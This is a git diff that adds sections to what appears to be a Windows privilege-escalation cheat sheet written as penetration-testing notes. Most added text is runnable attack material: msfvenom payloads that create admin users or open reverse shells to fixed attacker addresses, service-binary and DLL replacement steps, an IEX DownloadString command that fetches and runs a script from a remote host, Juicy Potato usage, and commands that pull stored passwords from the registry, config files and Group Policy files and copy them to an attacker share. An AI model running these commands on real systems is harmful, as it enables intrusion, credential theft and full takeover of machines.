@@ -231,7 +231,67 @@ sc start regsvc
 ```
 
 ## Executable File
+Sometimes, you don't have to think too hard. If you can simply change the executable file with your payload, this could be a viable path to privilege escalation.   
+
+**How to detect vulnerable services:** Search for services that run as LocalSystem. For each of these services, check whether you have write access to the executable that is executed by the service. This makes the following requirements:   
+- We have write access to the executable of the service
+- The service is running with LocalSystem privileges
+
+```
+#for each service, check  the permissions of the executable, if you have write / full access, overwrite executable with own payload
+accesschk64.exe -wvu  "C:\Program Files\File Permissions Service"   
+```   
+> Tip: To speed up the process (not having to check all services), only verify the services that WinPEAS marks as 'Special' aka non-default services.   
+
+#### Exploit
+```
+#Create your payload
+msfvenom -p windows/exec CMD='net user xhack SecurePass1337 /add; net localgroup administrators xhack /add' -f exe-service -o payload.exe
+
+#place payload in writable folder (in the example below, filepermservice.exe is the vulnerable executable)
+cd "c:\Program Files\File Permissions Service"
+cp //192.168.194.141/share/tmp/payload.exe .
+mv payload.exe filepermservice.exe
+
+#restart service
+sc start regsvc
+```   
+
 ## DLL Hijacking
+Services often run programs that on their turn, load and execute separate DLLs. These DLLs are not always secured with the correct privileges, or are just not present on the current system. When we can make a service (with system privileges) load our malicious payload instead, we can use it to get system.    
+**How to detect vulnerable services:**  I haven't figured out a foolproof way of detecting vulnerable DLLs so I will kindly refer you to fuzzysecurity's guide:   
+[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)   
+
+```
+#Check the path you are using
+echo %path%
+
+#Check for all dirs in path what access  rights you have
+accesschk.exe -dqv "C:\Python27"
+cacls "C:\Python27"
+
+#Check if any service is calling for DLL's that do not exist on the system
+	#if you have RDP, you can use Process Monitor from the systinternals suite
+	#check in the registry if any dll is loaded ("ServiceDLL")
+	#search for the location of the DLL
+	dir wlbsctrl.dll /s
+
+#check if the service restarts at boot time
+sc qc IKEEXT
+	START_TYPE:    2 AUTO_START
+```
+
+#### Exploit
+
+```
+#generate malicious DLL
+msfpayload windows/shell_reverse_tcp lhost=10.11.0.79 lport=9988   -o <name of hijackable dll>.dll
+
+#place dll in writable path folder
+
+#reboot system / restart service
+```
+
 # Password mining
 Administrators are often lazy and use weak passwords or reuse them. When performing our password mining, we scout for (hashed) passwords that administrators maybe reused for their main account. Further these passwords could also get us access to other services like databases.   
 #### Passwords stored by user
@@ -243,10 +303,152 @@ dir /s C:\Users
 ```   
 
 ## Passwords stored by user
+Sometimes users store their passwords in plain-text in an unsecured file. When we can find these passwords, it is a quick win for us.   
+
+```
+#check for files in home folders of users with names that could mean they hold passwords
+dir /s C:\Users
+```
+
 ## Registry
+Sometimes developers and admins store passwords of services in the registry.
+
+```
+# VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+	--> crack password with vncpwd.exe
+
+# Windows autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+
+# SNMP Parameters
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+# Putty
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+	#NOTE: if you get redirected, use that redirect
+	reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42"
+
+# Search for password in registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
 ## Configuration Files
+
+When programs have to authenticate to other services, the passwords are often stored in the configuration files. The following list contains juicy files that could get us lucky.   
+1. Windows configuration files   
+
+```
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+c:\unattend.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+```
+
+2. Config files of web server
+
+```
+#search for the file
+C:\inetpub\wwwroot\web.config
+#search for password in following line "connectionString"
+```
+
+3. VNC config files
+
+```
+dir c:\*vnc.ini /s /b
+dir c:\*ultravnc.ini /s /b
+dir c:\ /s /b | findstr /si *vnc.ini
+```
+
+4. McAfee SiteList
+
+```
+#on target
+#search for file SiteList.xml
+dir /s/b SiteList.xml
+#copy file to kali (after setting up impacket-smbserver)
+cp "C:\Users\All Users\McAfee\Common Framework\SiteList.xml" //192.168.194.141/share/tmp
+
+#on kali
+#grep encrypted password
+grep -i password SiteList.xml
+#decrypt password
+python mcafee_sitelist_pwd_decrypt.py [encryptedpassw
+```
+
+5. group policy preference
+
+```
+#getting the file:
+    # Output environment-variables
+    set
+    # Look for the following:
+    LOGONSERVER=\\NAMEOFSERVER
+    USERDNSDOMAIN=WHATEVER.LOCAL
+    # Look up ip-addres
+    nslookup nameofserver.whatever.local
+    # It will output something like this
+    Address:  192.168.1.101
+    # Now we mount it
+    net use z: \\192.168.1.101\SYSVOL
+    # And enter it
+    z:
+    # Now we search for the groups.xml file
+    dir Groups.xml /s
+
+#decrypting the password
+    #the pass is AES encrypted but the key is publicly known
+    gpp-decrypt encryptedpassword
+
+#other files for which this might be the case
+    Services\Services.xml #Element-Specific Attributes
+    ScheduledTasks\ScheduledTasks.xml #Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
+    Printers\Printers.xml #SharedPrinter Element
+    Drives\Drives.xml #Element-Specific Attributes
+    DataSources\DataSources.xml #Element-Specific Attributes
+```
+
+6. The getting desperate searches
+
+```
+#find the string 'password' in all files of certain file type
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+
+#Find all these strings in config files.
+dir /s *pass* == *cred* == *vnc* == *.config*
+
+# Find all passwords in all files.
+findstr /spin "password" *.*
+findstr /spin "password" *.*
+```
+
+
+
 # Registry
 ## AutoRun
+Programs that are listed as autorun in the registry are executed automatically when users login to the system. What is interesting to us, is that the executable runs with the privileges of the user that logs in.   
+**Detect vulnerable autorun programs:** We need the following two requirements:   
+- We need a startup program for which we have write access to the binary   
+- We need an Administrator to login into the system   
+
+```
+#check what programs run on startup
+wmic startup get caption,command 2>nul
+#check if you have write access to the binary of the executable
+icacls "C:\Program Files\Autorun Program\program.exe"
+```
+
+#### Exploit
+- replace executable with reverse shell / admin user add command
+- wait till someone logs in with admin 
+
+
 ## AllwaysInstallElevated
 When the AlwaysInstallElevated key is set for HKLM and HKCU in the registry, each newly installed program automatically gets system privileges. We just have to install our payload and we have **system**.    
 #### detect vulnerability:   
@@ -268,11 +470,66 @@ msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
 ```    
 
 # Scheduled Tasks
+Through scheduled tasks, admins can specify what programs should start immediately after booting the system. When we can replace the binary that would be loaded, we can get our payload executed with higher privileges.    
+**How to detect vulnerable scheduled tasks:** First get a list of all scheduled task with system privileges, then check if you have write access to the binary. This makes the following requirements:    
+
+- The scheduled task runs under system   
+- You have write access to the executable to which the task points (or exe is missing)   
+
+```
+#on target
+#List all scheduled tasks with system privileges
+schtasks /query /fo LIST /v
+
+#on machine attack
+#copy over list and check for tasks as system
+cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+
+#on target
+#check if you have write access to executable to which the task points
+accesschk.exe -dqv "C:\Missing Scheduled Binary\"
+```   
+
+#### Exploit
+```
+#Generate new payload
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o test.exe
+#replace the task executable with our payload
+```   
+
 
 # Hot Potato
+This technique is a combination of two known windows issues like NBNS spoofing and NTLM relay with the implementation of a fake WPAD proxy server which is running locally on the target host.   
+NTLM authentication via the same protocol like SMB has been already patched by Microsoft however this technique is using HTTP to SMB authentication in order to create a high privilege service as the HTTP request might come from a high privilege service like the Windows update. Since the traffic contains the NTLM credentials and is passing through a fake proxy server it can be captured and passed to a local SMB listener to create an elevated service which can execute any command as SYSTEM.   
+
 ## Detect
+Check the privileges of the current user. If the user has one of following privs, you can get system.   
+- SeImpersonatePrivilege   
+- SeAssignPrimaryPrivilege   
+- SeTcbPrivilege   
+- SeBackupPrivilege   
+- SeRestorePrivilege   
+- SeCreateTokenPrivilege   
+- SeLoadDriverPrivilege   
+- SeTakeOwnershipPrivilege   
+- SeDebugPrivilege   
+
 ## Exploit
+When you have ```SeImpersonatePrivilege``` or ```SeAssignPrimaryPrivilege``` you can get system through the **Rotten Potato exploit**. The updated version of this exploit is called **Juicy Potato**.   
+```
+#executable - JuicyPotato
+#generate reverse  shell that we want to trigger as a system shell
+msfvenom -p windows/shell_reverse_tcp LHOST=$kaliip LPORT=444 -e x86/shikata_ga_nai -f exe -o rev.exe
+
+#trigger the exploit (https://github.com/ivanitlearning/Juicy-Potato-x86/releases)
+JuicyPotato.exe -l 1340 -p C:\users\User\rev.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+
+#Powershell - Invoke-Tater1
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.194.141:1234/Invoke-Tater.ps1'); Invoke-Tater -Trigger 1 -Command 'net localgroup Administrators user /add'"
+```
+
 # Startup Aplications
+
 #### Detect if vulnerable:
 
 ```
